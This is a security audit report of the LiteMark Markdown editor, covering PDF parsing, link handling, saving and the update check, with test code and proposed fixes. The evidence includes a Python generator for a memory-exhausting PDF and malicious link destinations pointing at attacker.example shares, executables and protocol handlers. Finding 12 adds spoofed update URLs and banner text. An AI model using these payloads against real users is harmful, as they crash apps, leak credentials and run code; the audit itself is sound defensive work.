# Lane C: filesystem, paths, save safety, links, update check, PDF

Status: complete

Toolchain: rustc/cargo 1.97, Linux x86_64, ext4, run as root in a container (no display). Audited commit
`ea03a57`. No tracked source was changed.

How things were proven:
- Throwaway tests in a private worktree (not committed) that call the real functions against temp
  directories. Run with `cargo test lane_c_ -- --nocapture --test-threads=1`.
- For anything that goes through the window (link clicks, save, the save-name box), the real `LiteMarkApp`
  was driven through gpui's `TestAppContext` (the repo already does this in `src/table_drag_handler_tests.rs`).
  Mouse clicks were sent with `cx.simulate_event`, so the app's own listeners ran. This is not a real display,
  and the OS side of `open_url` was read from the gpui 0.2.2 source, not executed.
- PDF checks ran in two scratch crates outside the repo: a verbatim copy of `extract_text_from_pdf` against
  lopdf 0.34.0 (what `Cargo.lock` pins) and against lopdf 0.47.0 (newest on crates.io).
- `strace` for the settings write pattern, an `LD_PRELOAD` shim for a filesystem without `RENAME_NOREPLACE`,
  `seteuid(65534)` inside one test for the permission checks.
- Line numbers refer to the unmodified tree.

Limits: Windows and macOS behaviour could not be run. A case-insensitive filesystem could not be mounted here
(tmpfs and ext4 `casefold` are both refused by this kernel). Where that matters the finding says so.

## Findings

### 1. A 476 KB PDF makes the app allocate 11.5 GB and abort; upgrading lopdf does not fix it
- Severity: Critical
- Category: Security
- Location: `src/services/pdf_service.rs:3-29` (no cap on file size, page count or output size; one page at a
  time is extracted and all of it is joined into one `String`), called on the UI thread from
  `src/app/commands.rs:363` (File > Open; PDFs are not listed in the sidebar and not opened from the command line).
- Problem: the PDF format lets many pages point at the same compressed content stream. A file with 3,000 pages
  that all reference one 2 MB text stream (5 KB compressed) is 476 KB on disk and produces 6 GB of extracted
  text. The window is frozen for over a minute, then the process is killed for lack of memory (or aborts on the
  failed allocation), and every unsaved tab is lost. Scaling the page count scales the damage linearly. This is
  a different failure from lane A's nested-array stack overflow and survives the lopdf upgrade.
- Evidence: PROVEN in a scratch crate with the function copied verbatim, release and dev builds.
  ```
  # lopdf 0.34.0
  manypages.pdf (476469 bytes): OK pages=3000 markdown_len=6006058886 time=69.66567929s peak_rss=11539MB
  textbomb.pdf  (624299 bytes): OK pages=1 markdown_len=300300010 time=3.834570159s peak_rss=1539MB
  bomb1024.pdf (1044247 bytes): OK pages=1 markdown_len=50 time=2.39967822s peak_rss=2115MB
  # same file, 8 GB address-space limit (ulimit -v 8388608)
  memory allocation of 6006058886 bytes failed        -> exit 134 (SIGABRT)
  # lopdf 0.47.0
  manypages.pdf (476469 bytes): OK pages=3000 markdown_len=6006058886 time=83.511677685s peak_rss=11479MB
  textbomb.pdf  (624299 bytes): OK pages=1 markdown_len=50 time=227.813437ms peak_rss=266MB   (0.47 caps one stream)
  ```
  Generator for `manypages.pdf` (Python, writes a classic xref table):
  ```python
  big  = (b"BT /F1 12 Tf (" + b"A"*1000 + b") Tj ET\n") * 2000          # 2 MB of text operators
  comp = zlib.compress(big, 9)
  N    = 3000
  kids = b" ".join(b"%d 0 R" % (i + 5) for i in range(N))
  objs = [b"<< /Type /Catalog /Pages 2 0 R >>",
          b"<< /Type /Pages /Kids [" + kids + b"] /Count %d >>" % N,
          b"<< /Length %d /Filter /FlateDecode >>\nstream\n" % len(comp) + comp + b"\nendstream",
          b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>"]
  objs += [b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 3 0 R"
           b" /Resources << /Font << /F1 4 0 R >> >> >>"] * N
  # then: "%PDF-1.4", each object as "n 0 obj ... endobj", xref, trailer << /Size /Root 1 0 R >>, startxref
  ```
  Not driven through the GUI; the app calls the same function and then also parses the result as Markdown.
- Suggested fix: run extraction on a background thread, and stop with an error once the output passes a fixed
  budget (for example 20 MB of text or a page limit). Refuse input files above a size cap before loading.

### 2. Ctrl+click on a link hands any string to the OS opener
- Lane A item "link schemes": **CONFIRMED WITH CHANGES.** The behaviour is as lane A described. Changes:
  severity raised from Medium to High; it is not only URL schemes, bare Windows paths and UNC paths arrive
  unchanged too; reference-style links and images turned out not to be clickable.
- Severity: High
- Category: Security
- Location: `src/app/editor_events.rs:331-335` (`cx.open_url(&url)`), fed by `src/markdown/parser.rs:1436-1437`
  (`dest_url` stored as-is), `src/markdown/parser.rs:2384-2397` (`link_hits`), `src/ui/text_editor.rs:436-447`.
- Problem: in WYSIWYG mode the link text is all the user sees; the destination is hidden. Ctrl+click (Cmd+click
  on macOS) passes the destination to `open_url` with no check. In gpui 0.2.2 that means:
  Windows `ShellExecuteW(NULL, "open", <string>, ...)` (`platform/windows/platform.rs:424-437, 839-859`), which
  runs an executable, script or shortcut given by path, connects to `\\host\share` (sending the user's NTLM
  credentials to that host), and starts any registered protocol handler; macOS `NSWorkspace openURL`
  (`platform/mac/platform.rs:647-655`); Linux the desktop portal, then `xdg-open` (`platform/linux/platform.rs:596-632`;
  the string must parse as a URL there, so relative paths and backslash paths are dropped on Linux only).
  One click on a note received from someone else is enough.
- Evidence: PROVEN up to the `open_url` call, by a simulated Ctrl+click on the first row of a one-line document
  in the real app window. What the OS does with the string is from reading gpui, not from a run.
  ```
  [click here](file:///etc/passwd)                         => open_url(Some("file:///etc/passwd"))
  [click here](file:///C:/Windows/System32/calc.exe)       => open_url(Some("file:///C:/Windows/System32/calc.exe"))
  [click here](\\\\attacker.example\\share\\payload.exe)   => open_url(Some("\\\\attacker.example\\share\\payload.exe"))
  [click here](C:\Windows\System32\calc.exe)               => open_url(Some("C:\\Windows\\System32\\calc.exe"))
  [click here](<C:\Program Files\a b.exe>)                 => open_url(Some("C:\\Program Files\\a b.exe"))
  [click here](file://attacker.example/share/x)            => open_url(Some("file://attacker.example/share/x"))
  [click here](../../payload.sh)                           => open_url(Some("../../payload.sh"))
  [click here](payload.desktop)                            => open_url(Some("payload.desktop"))
  [click here](javascript:alert(1))                        => open_url(Some("javascript:alert(1)"))
  [click here](ms-msdt:/id%20PCWDiagnostic)                => open_url(Some("ms-msdt:/id%20PCWDiagnostic"))
  [click here](search-ms:query=x&crumb=location:\\a.example\s) => open_url(Some("search-ms:query=x&crumb=location:\\a.example\\s"))
  [click here](vscode://file/etc/passwd)                   => open_url(Some("vscode://file/etc/passwd"))
  [click here](smb://attacker.example/share)               => open_url(Some("smb://attacker.example/share"))
  <file:///etc/passwd>                                     => open_url(Some("file:///etc/passwd"))
  [https://example.com/safe](file:///etc/passwd)           => open_url(Some("file:///etc/passwd"))
  [click here][r]\n\n[r]: file:///etc/shadow               => open_url(None)      (reference links: not clickable)
  https://example.com/bare                                 => open_url(None)      (no bare-URL autolink)
  ![click here](file:///etc/passwd)                        => open_url(None)      (images: not clickable)
  no ctrl, wysiwyg => None        ctrl, raw mode => None
  ```
  (The values are Rust debug strings: `\\\\` in the output is two backslashes.) Test:
  ```rust
  fn click_first_row(content: &str, ctrl: bool) -> Option<String> {
      let mut cx = TestAppContext::single();
      let (view, cx) = cx.add_window_view(|_w, cx| LiteMarkApp::test_new(content, cx));
      let mut cx = cx.clone();
      cx.update(|window, _| window.refresh());
      cx.run_until_parked();
      let (origin, h) = view.read_with(&cx, |app, _| {
          let p = app.editor_paint.borrow();
          (p.rows[0].origin, p.rows[0].line_height)
      });
      cx.simulate_event(MouseDownEvent {
          button: MouseButton::Left,
          position: point(origin.x + px(6.0), origin.y + h / 2.0),
          modifiers: Modifiers { control: ctrl, ..Modifiers::default() },
          click_count: 1,
          ..MouseDownEvent::default()
      });
      cx.run_until_parked();
      cx.opened_url()
  }
  ```
- Suggested fix: parse the destination and open it only when the scheme is `http`, `https` or `mailto`. For
  anything else show the full destination and do nothing, or ask first.

### 3. Save silently overwrites a file that changed on disk since it was opened
- Severity: Medium
- Category: Logic
- Location: `src/app/tabs.rs:6-41` (`save_tab` writes whenever asked; nothing records the file's mtime, size or
  hash at open time), `src/app/tabs.rs:83-93` (`open_loaded_tab` switches to the existing tab and throws away
  the content it was just given), callers `src/app/render.rs:637`, `src/app/sidebar.rs:242`.
- Problem: if a sync client, `git pull` or a second editor rewrites a note that is open in a tab, LiteMark
  keeps showing the old text, even after the user clicks the note again in the sidebar. Ctrl+S then replaces
  the newer file with the old text. No prompt, no error, and it happens even when the tab has no edits. A file
  deleted elsewhere is silently recreated the same way.
- Evidence: PROVEN in the app harness.
  ```
  tab after re-click: "line written in LiteMark\n" modified=false
  save_tab -> Ok("journal.md"); error shown = None; prompt open = false
  file on disk now: "line written in LiteMark\n"          (the externally added text is gone)
  after external delete: save_tab -> Ok("journal.md"), exists = true
  ```
  ```rust
  std::fs::write(&path, "line written in LiteMark\n").unwrap();
  app.workspace = scan_workspace_dir(&root, true);
  let file = app.workspace.files[0].clone();
  app.open_loaded_tab(file.name.clone(), read_note(&file.path).unwrap(), Some(file.path.clone()), Some(file.id.clone()));
  std::fs::write(&path, "line written in LiteMark\nTEN PARAGRAPHS ADDED ELSEWHERE\n").unwrap();
  app.open_loaded_tab(file.name.clone(), read_note(&file.path).unwrap(), Some(file.path.clone()), Some(file.id.clone()));
  let id = app.active_tab_id.clone();
  println!("{:?}", app.save_tab(&id));
  println!("{:?}", std::fs::read_to_string(&path).unwrap());
  ```
- Suggested fix: store mtime and length (or a hash) with the tab when it is loaded or saved. Before a save,
  compare and ask "changed on disk: overwrite, reload or cancel". When an unmodified tab is re-activated and
  the file is newer, reload it.

### 4. One click on a large or binary file reads all of it into memory on the UI thread
- Severity: Medium
- Category: Performance
- Location: `src/services/fs_service.rs:330-337` (`fs::read` of the whole file, then the binary check on the
  first 8 KiB), `src/model/document.rs:79-84` (every unknown extension is `PlainText`),
  `src/services/fs_service.rs:691-695` (plain text is always listed), callers on the UI thread:
  `src/app/render.rs:637`, `src/app/sidebar.rs:242`, `src/app/commands.rs:378`, `src/app.rs:228` (startup),
  `src/main.rs:48` (only `exists()` is checked for the command-line path).
- Problem: the sidebar lists every regular file that is not code or PDF, so `backup.iso`, `video.mp4` or
  `photo.jpg` show up as notes. Clicking one reads the entire file before the first 8 KiB are tested for NUL
  bytes. A multi-gigabyte file freezes the window and can exhaust memory, which loses unsaved tabs. There is no
  size cap for text files either. Separately, `litemark <path-to-a-FIFO>` (or picking one in File > Open) blocks
  forever in `fs::read`, before the window appears in the command-line case.
- Evidence: PROVEN at the service layer (debug build, sparse file so no disk was used).
  ```
  sidebar lists: ["backup.iso", "photo.jpg"]
  read_note(1024 MB file) -> Err("binary file, can't open") after 878.677555ms; peak RSS 15 MB -> 1039 MB
  p.exists() (the only check main.rs makes on argv[1]) = true
  read_note still blocked after 3 s                        (FIFO; not listed by the scan)
  ```
  ```rust
  let f = fs::File::create(d.join("backup.iso")).unwrap();
  f.set_len(1 << 30).unwrap();
  println!("{:?}", scan_workspace_dir(&d, false).files.iter().map(|f| &f.name).collect::<Vec<_>>());
  let t = Instant::now();
  let r = read_note(&d.join("backup.iso"));   // VmHWM read from /proc/self/status before and after
  ```
- Suggested fix: `metadata()` first: reject non-regular files and files over a cap (say 50 MB) with a message.
  Read the first 8 KiB, run the binary check, then read the rest. Read on a background task.

### 5. `atomic_save` replaces the file's inode: hard links split, owner and group reset, read-only ignored
- Severity: Medium
- Category: Logic
- Location: `src/services/fs_service.rs:212-275` (`write_temp` creates a new file, copies only the mode bits at
  `:252`, then `rename` at `:269`).
- Problem: write-to-temp-then-rename is the right default and it is done carefully here (same directory, random
  name, `create_new`, fsync of file and directory, temp removed on failure, symlinks resolved). The side effects
  are not handled:
  1. A note with a second hard link is split in two. The other name keeps the old text for good.
  2. Owner and group become the saving user's. In a shared folder, a file `alice:staff 0660` saved by Bob
     becomes `bob:bob 0660` and Alice can no longer read it. Extended attributes and ACLs are dropped the same way.
  3. A read-only file (0444, owned by someone else) in a directory the user can write to is replaced without
     any warning, although a direct write would be refused.
  4. A file the user may write, in a directory the user may not write to, cannot be saved at all.
- Evidence: PROVEN. Items 3 and 4 ran with the effective uid dropped to 65534.
  ```
  inode 573970 -> 573971, nlink 2 -> 1, uid:gid 1234:4321 -> 0:0
  note.md = "v2", hard link same-note-other-name.md = "v1"
  (1) file writable by user = true; atomic_save -> Err("Permission denied (os error 13)")
  (2) file writable by user = false; atomic_save -> Ok(()); content now "overwritten", owner uid 65534 mode 444
  ```
  ```rust
  fs::write(&a, "v1").unwrap();
  fs::hard_link(&a, &b).unwrap();
  std::os::unix::fs::chown(&a, Some(1234), Some(4321)).unwrap();
  atomic_save(&a, "v2").unwrap();
  let m = fs::metadata(&a).unwrap();           // ino, nlink, uid, gid changed
  assert_eq!(fs::read_to_string(&b).unwrap(), "v1");
  ```
- Suggested fix: before the rename, if the target has `nlink > 1`, or its owner or group differs from what the
  temp file got and `chown` fails, or the directory is not writable, fall back to writing in place (truncate,
  write, fsync). Refuse or ask when the target is not writable by the user.

### 6. Workspace scan recurses once per folder level; a 2,000-level tree overflows a 1 MiB stack
- Severity: Medium
- Category: Security
- Location: `src/services/fs_service.rs:652-717` (`walk`), run on the UI thread at startup (`src/app.rs:217`),
  on workspace switch (`src/app/file_ops.rs:52`) and after every save, create, rename, move and trash
  (`src/app/sidebar.rs:309-323`, `src/app/tabs.rs:56`).
- Problem: there is no depth limit. On Linux the absolute path limit (4,096 bytes) stops the tree at about
  2,000 levels, and the release build needs between 1 and 2 MiB of stack for that, which fits the 8 MiB main
  thread. The Windows main thread has 1 MiB by default (the repo sets no `/STACK`), and Windows paths can be
  about 32,000 characters, so a crafted folder tree would abort the app when it is chosen as the workspace.
  A stack overflow is a hard abort; unsaved tabs are lost.
- Evidence: PROVEN on Linux for a 1 MiB stack, with `scan_workspace_dir` and `FileType::from_filename` included
  verbatim in a scratch crate built with the repo's release profile (opt-level 3, thin LTO, panic abort).
  Windows itself is UNPROVEN (could not be run). Symlink loops are not a way in: links are skipped.
  ```
  created 1999 nested folders (absolute path length 4097)
  stack 0 KiB (main thread, 8 MiB): scan returned 1999 folders
  stack 2048 KiB: scan returned 1999 folders
  stack 1024 KiB: thread has overflowed its stack / fatal runtime error: stack overflow, aborting
  ```
  In the repo's own (debug) test binary the same tree overflows the 2 MiB test thread.
- Suggested fix: walk with an explicit stack (`Vec<PathBuf>`) and stop at a fixed depth (for example 64) and a
  fixed entry count, with a "folder too large, showing the first N items" note.

### 7. Rename and move fail on filesystems without `RENAME_NOREPLACE`
- Severity: Medium
- Category: Logic
- Location: `src/services/fs_service.rs:421` (`safe_rename`), `:460` (`move_note`), `:480` (`move_folder`): all
  call `rename_noreplace(...)?`. Only `atomic_save_new` (`:298-316`) handles `ENOSYS`/`EINVAL`.
- Problem: on Linux, NFS and several FUSE filesystems reject `renameat2` with flags (`EINVAL`). The helper
  `noreplace_unsupported` exists for exactly this, but only the new-file save path uses it. With the notes
  folder on such a mount, every rename and every drag-and-drop move fails with "Invalid argument" while
  saving works. Nothing is lost; the feature is just dead.
- Evidence: PROVEN by simulation. No such filesystem can be mounted in this container, so `renameat2` was
  interposed with an `LD_PRELOAD` shim that returns `EINVAL` when flags are set.
  ```
  --- with shim
  atomic_save_new -> Ok("new.md")
  safe_rename     -> Err("Invalid argument (os error 22)")
  move_note       -> Err("Invalid argument (os error 22)")
  move_folder     -> Err("Invalid argument (os error 22)")
  --- without shim: safe_rename -> Ok(".../b.md")
  ```
  ```c
  int renameat2(int ofd, const char *o, int nfd, const char *n, unsigned int flags) {
      if (flags != 0) { errno = EINVAL; return -1; }
      return syscall(SYS_renameat2, ofd, o, nfd, n, flags);
  }   /* gcc -shared -fPIC -o norename2.so norename2.c; LD_PRELOAD=./norename2.so <test binary> */
  ```
- Suggested fix: put the fallback inside `rename_noreplace` for Linux: on `ENOSYS`/`EINVAL` use the existing
  `rename_noreplace_portable` (hard link then unlink for files, check then rename for folders).

### 8. Settings are written in place, write errors are dropped, and any parse error resets everything
- Lane A item "settings writes": **CONFIRMED WITH CHANGES.** All three parts hold. Changes: severity lowered
  from Medium to Low (only preferences and the recent-folder list are at stake, no document data, and startup
  opens nothing from this file), and three more facts are added below.
- Severity: Low
- Category: Logic
- Location: `src/model/settings.rs:107-129`; field defaults at `src/model/settings.rs:35-42`.
- Problem: `save` is `open(O_TRUNC)` plus one `write`: no temp file, no fsync, no rename, result ignored. A
  full disk or a crash between the two calls leaves an empty or cut file. `load` turns any error into
  `Default`, and the next setting change writes those defaults over the damaged file. New facts:
  (a) a single wrong-typed or unknown value (for example a theme name written by a newer version) discards
  the whole file; (b) a valid file that lacks `zoom_level` loads it as 0, not 100, and the editor then draws
  rows 0 px high, so the text is invisible until the user resets zoom; (c) values are not range-checked
  (`zoom_level` 18446744073709551615 and `base_font_size` -1e30 load as given; no panic in the harness).
  What a hostile file cannot do: it cannot make the app open or scan a path at startup. The workspace is always
  the default notes folder; `recent_folders` only fills a menu.
- Evidence: PROVEN. `XDG_CONFIG_HOME` pointed at a temp directory; real `EditorSettings::save`/`load`.
  ```
  strace: openat(AT_FDCWD, ".../litemark/settings.json", O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC, 0666) = 3
          write(3, "{\n  \"theme\": \"YaruDark\",\n  \"zoom"..., 414) = 414        (nothing else)
  after truncation: zoom=100 recent=[] dismissed=None
  file after next save still contains 'journal': false
  empty file -> zoom=100
  '{}' -> zoom_level=0 show_sidebar=false (Default::default gives 100 / true)
  one wrong-typed field -> recent=[] dismissed=None
  extreme -> zoom=18446744073709551615 font=-1000000000000000000000000000000 recent=["/etc", "/proc/self/root"]
  save() into an unwritable location returned (); settings.json exists = false
  zoom=0 font=17: drew (19, Some(0px))                    (app harness: 19 rows, line height 0)
  ```
  ```rust
  std::env::set_var("XDG_CONFIG_HOME", &root);
  let mut s = EditorSettings::default();
  s.recent_folders = vec![PathBuf::from("/home/u/work"), PathBuf::from("/home/u/journal")];
  s.save();
  let path = root.join("litemark/settings.json");
  let full = fs::read_to_string(&path).unwrap();
  fs::write(&path, &full[..full.len() / 2]).unwrap();
  let loaded = EditorSettings::load();         // defaults, recent_folders empty
  loaded.save();                               // damaged file overwritten with defaults
  ```
- Suggested fix: write through `atomic_save`, return the error and show one toast. On a parse error rename the
  file to `settings.json.bad` first. Give `zoom_level` a serde default of 100 and clamp zoom and font size on load.

### 9. Renaming a dotfile removes its leading dot
- Severity: Low
- Category: Logic
- Location: `src/services/fs_service.rs:74-83` (`sanitize_name` trims dots at both ends), used by
  `safe_rename` at `:382`.
- Problem: the sidebar lists dotfiles (`.gitignore`, `.env`, `.bashrc`) and the rename box is pre-filled with
  the current name. Pressing Enter without changing anything renames `.gitignore` to `gitignore`. Typing
  `.env.local` gives `env.local`. In a project folder this quietly breaks the file's purpose.
- Evidence: PROVEN.
  ```
  listed in sidebar=true; rename ".gitignore" typed ".gitignore" -> Ok("gitignore")
  listed in sidebar=true; rename ".env" typed ".env.local" -> Ok("env.local")
  listed in sidebar=true; rename ".bashrc" typed ".zshrc" -> Ok("zshrc")
  ```
  ```rust
  fs::write(d.join(".gitignore"), "x").unwrap();
  println!("{:?}", safe_rename(&d.join(".gitignore"), ".gitignore"));
  ```
- Suggested fix: in rename, only strip trailing dots and spaces; keep a leading dot when the old name had one.
  Return early when the typed name equals the current name.

### 10. A file whose name is longer than about 218 bytes opens but can never be saved
- Severity: Low
- Category: Logic
- Location: `src/services/fs_service.rs:234` (temp name is `.{file_name}.{u64}.litemark-tmp`, up to 37 bytes
  longer than the target; the filesystem limit is 255 bytes).
- Problem: such a file opens and edits normally, then every Ctrl+S fails with "File name too long". Save As
  to a shorter name works, so the text is not lost if the user thinks of it.
- Evidence: PROVEN on ext4.
  ```
  name of 220 bytes: open ok=true, atomic_save -> Ok(())
  name of 230 bytes: open ok=true, atomic_save -> Err("File name too long (os error 36)")
  name of 252 bytes: open ok=true, atomic_save -> Err("File name too long (os error 36)")
  ```
  ```rust
  let p = d.join(format!("{}.md", "n".repeat(227)));
  fs::write(&p, "original").unwrap();
  println!("{:?}", atomic_save(&p, "edited"));
  ```
- Suggested fix: build the temp name from a short fixed prefix plus the random suffix, not from the file name.

### 11. The save-name box for an untitled tab accepts separators, `..` and absolute paths
- Severity: Low
- Category: Standards
- Location: `src/app/file_ops.rs:294-305` (the typed text becomes `tab.title` unchanged),
  `src/model/session.rs:178-187` (`folder.join(title)`), `src/app/tabs.rs:30-41` (`atomic_save_new` creates
  missing parent folders).
- Problem: New note and Rename pass the typed name through `sanitize_name`; this third entry point does not.
  `../x` saves outside the workspace (and gets no `.md`, because the name contains a dot), `a/b/c` creates
  folders, an absolute path writes wherever the user is allowed to, `..` creates a file named `.. 2`. The user
  types the name, so this is an inconsistency and a way to lose track of a note, not an attack. On Windows the
  same gap lets `CON`, `a:b` and `<>|?*` through (`sanitize_name` does not filter those either; effect on
  Windows UNPROVEN, not run).
- Evidence: PROVEN in the app harness (`begin_save_naming` then `commit_save_naming(Some(name))`).
  ```
  typed "../escaped" -> saved at Some("workspace/../escaped"); inside workspace = Some(false); error = None
  typed "sub/dir/note" -> saved at Some("workspace/sub/dir/note.md"); inside workspace = Some(true); error = None
  typed ".." -> saved at Some("workspace/.. 2"); inside workspace = Some(true); error = None
  typed "<tmp>/abs-target" -> saved at Some("abs-target.md"); inside workspace = Some(false); error = None
  sanitize_name("CON") = "CON"   sanitize_name("a:b.md") = "a:b.md"   sanitize_name("x\ny.md") = "x\ny.md"
  ```
- Suggested fix: run the typed name through `sanitize_name` in `commit_save_naming`, and extend
  `sanitize_name` to replace control characters and `<>:"|?*` and to reject Windows reserved device names.

### 12. Update check: the release-URL check passes `..` segments, and the tag text is shown without limits
- Severity: Low
- Category: Security
- Location: `src/services/update_service.rs:47` (`starts_with` on the raw string), `:18-21` and `:51`
  (everything after the first `-` or `+` in the tag is ignored for parsing but kept for display),
  shown at `src/app/render.rs:1588-1635`.
- Problem: only someone who controls the API response can use this (GitHub itself, or a broken TLS path, see
  lane A's rustls-webpki item). Given that, the Download button can be pointed at any path on github.com,
  because browsers resolve `releases/../../../other/repo`. The banner text can carry arbitrary words and
  newlines after a valid version number. Other look-alike tricks (`@`, longer host, prefix without the slash,
  upper-case scheme) are rejected, so the link cannot leave github.com.
- Evidence: PROVEN on `parse_release`.
  ```
  https://github.com/Sira-pel/LiteMark/releases/../../../evil-org/evil-repo/releases/tag/v9.9.9   -> Some(same string)
  https://github.com/Sira-pel/LiteMark/releases/%2e%2e/%2e%2e/%2e%2e/evil-org                     -> Some(same string)
  https://github.com/Sira-pel/LiteMark/releases@evil.example/        -> None
  https://github.com/Sira-pel/LiteMark/releasesX/                    -> None
  https://github.com.evil.example/Sira-pel/LiteMark/releases/        -> None
  https://github.com@evil.example/Sira-pel/LiteMark/releases/        -> None
  TAG version shown = "9.9.9-URGENT: your copy is infected.\nGo to evil.example now"  newer_than_current = true
  5MB tag accepted: version len = Some(5000006)
  ```
  ```rust
  let body = serde_json::json!({"tag_name": "v9.9.9", "html_url":
      "https://github.com/Sira-pel/LiteMark/releases/../../../evil-org/evil-repo/releases/tag/v9.9.9"}).to_string();
  assert!(parse_release(&body).is_some());
  ```
- Suggested fix: ignore `html_url` and build the link from the validated tag
  (`.../releases/tag/v{major}.{minor}.{patch}`), and show only the parsed numbers.

## lopdf upgrade check (requested)

Scratch crates outside the repo, same code in both, only the dependency line differs.

- lopdf 0.47.0 is the newest release. It has no `nom_parser` feature any more (features: async, chrono,
  chrono-clock, default, embed_image, font_embedding, image, jiff, rayon, serde, time, tokio, wasm_js).
  With `lopdf = { version = "0.47", default-features = false }` the body of `pdf_service.rs` compiles
  unchanged: `Document::load`, `get_pages`, `extract_text(&[u32])` are all still there.
- Lane A's repro (10,000 nested arrays, 20 KB) no longer aborts, and neither does the dictionary variant
  (10,000 nested `<< /A`), which also overflows the stack on 0.34.0:
  ```
  0.34.0  nested10000.pdf: thread 'main' has overflowed its stack / fatal runtime error: stack overflow, aborting
  0.34.0  nesteddict.pdf:  thread 'main' has overflowed its stack / fatal runtime error: stack overflow, aborting
  0.47.0  nested10000.pdf (20655 bytes): OK pages=1 markdown_len=25
  0.47.0  nesteddict.pdf (70656 bytes):  OK pages=1 markdown_len=25
  ```
- 0.47.0 also caps a single decompressed stream (1 GB bomb: 2,115 MB peak on 0.34.0, 323 MB on 0.47.0). It
  does not cap the total, see finding 1.
- Behaviour change to expect: for a font dictionary without `/Type /Font`, 0.34.0 extracts the text and 0.47.0
  returns none, so that page shows "No text layer detected". Not a crash either way in release builds.
- New transitive dependencies come with 0.47 (aes, cbc, ecb, md-5, sha2, brotli-decompressor, stringprep, rand,
  nom 8). Not audited here; rerun `cargo audit` after the bump.

## Checked and found fine

- `atomic_save` mechanics: temp file in the same directory with a random name and `create_new`; file fsync
  before rename; directory fsync after; mode bits kept (existing test); temp removed when the rename fails;
  save through a symlink writes the target and keeps the link; a dangling link creates its target; a symlink
  loop ends with "symlink chain too deep". One cosmetic leftover: after a crash between write and rename the
  `.name.N.litemark-tmp` file stays and is listed in the sidebar as a note.
- Bytes the user did not touch are kept. A UTF-8 file with BOM and CRLF line endings: save with no edit is
  byte-identical, and after a one-character edit only that byte differs (app harness, `save_tab`).
- Files that cannot be represented are refused, not damaged: Latin-1 ("invalid utf-8 sequence"), UTF-16
  ("binary file, can't open"). A NUL byte after the first 8 KiB is accepted and round-trips unchanged.
- `sanitize_name` for New note, New folder and Rename: `/`, `\`, NUL become `_`; `..` and `...` become empty and
  are rejected; `a/../b` becomes `a_.._b`; a 300-character name fails cleanly with "File name too long".
- No-replace semantics on Linux: create, rename, move and new-file save never overwrite an existing name
  (existing tests plus reruns). Moving a folder into its own child is blocked in the app
  (`drag_drop.rs:249`) and fails with `EINVAL` at the service layer; `copy_folder` into its own child fails
  with "File name too long" and removes the partial copy.
- Workspace scan: symlinks (to folders, to files, loops, links to `/etc`, broken links) are skipped, so nothing
  outside the workspace is listed and rename or trash cannot follow a link out. FIFOs and devices are not
  listed. Unreadable entries are skipped. Cost: 100,000 files in 2,040 folders scan in about 0.25 s, and
  `/usr` (78,781 files) in 1.25 s, debug build, warm cache. The scan runs on the UI thread after every save;
  lane D should measure that properly.
- Trash: `move_to_trash` works on Linux with `XDG_DATA_HOME` redirected; a missing file returns an error, and
  the app's restore path for a failed trash was read and looks right (lane A covered it too).
- Images and other external resources: none are loaded. `![alt](url)` is not fetched, not read from disk and
  not clickable. No network access happens when a document is opened. The only requests the app makes are the
  update check and whatever the OS does after `open_url`.
- Update check plumbing: one GET to a fixed `https://api.github.com/...` URL, 5 s total timeout, on the
  background executor; ureq's `into_string` stops at 10 MB; drafts and prereleases are skipped; versions compare
  numerically; an overflowing number or a fourth component is "not newer"; a failed check is retried next
  launch, a successful one at most daily. Nothing is downloaded or executed by the app.
- Settings at startup: nothing in `settings.json` makes the app read, scan or open a path on launch.
- PDF, other crafted inputs (0.34.0 and 0.47.0): a page tree that points at itself ("no pages" error), a
  `/Parent` cycle, a 20,000-level page tree, a `/Length` of 99,999,999,999: no crash, no hang. 150,000 random
  mutations of a small valid PDF through the verbatim extraction function, release build: 0 panics on either
  version. (A dev build of 0.34.0 hits a `debug_assert!` in `get_font_encoding`; release builds do not.)
- Same file in two tabs: the same path opens one tab. A different spelling (`dir/./a.md`, or a symlink picked
  in File > Open) opens a second tab on the same file. Low impact, noted here only.

## Not proven, noted for the reviewer

- Case-only rename (`readme.md` to `Readme.md`) on macOS and Windows: `safe_rename` refuses when the new name
  already "exists" (`fs_service.rs:414`), which on a case-insensitive filesystem is the file itself. Reasoned
  from the code; no case-insensitive filesystem could be mounted here.
- The portable no-replace path used on macOS and Windows (`rename_noreplace_portable`, hard link then delete)
  was only run on Linux by the existing test.
